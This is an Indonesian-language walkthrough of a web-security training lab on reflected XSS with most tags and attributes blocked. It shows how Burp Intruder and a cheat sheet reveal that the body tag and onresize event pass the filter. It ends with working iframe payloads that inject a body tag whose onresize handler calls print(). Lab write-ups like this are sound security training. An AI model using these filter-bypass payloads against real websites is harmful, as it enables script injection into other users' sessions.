## LAB 2 Reflected XSS into HTML context with most tags and attributes blocked

## Brief:
kerentanan reflected xss di pencarian, tapi pakai wfa
	
## Tujuan:
lakukan print()
	
## Analisa:

1. coba payload biasa dan tidak bisa 

       <img src=1 onerror=print()>
		
	 - step berikutnya adalah mencari tag mana yang tidak blokir dengan intruder
	 

3. sekarang set posisi di burp intruder <$$> dan masukan cheet sheat nya dan atttack
	 

4. saat selesai tag body 200 succes tapi yang lain 400 atau tidak diijinkan
	 

5. sekarang ganti ke berikut di pencarian dan copy event di cheet shet dan attack

       <body%20=1> -> <body%20$$=1
	    

6. resize 200 yang lain 400
	 

7. masukan exploit:

        <iframe src="https://exploit-0a0d0076044e873e806502fa015200ef.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
	    
	    	<iframe src="https://exploit-0a0d0076044e873e806502fa015200ef.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
	    
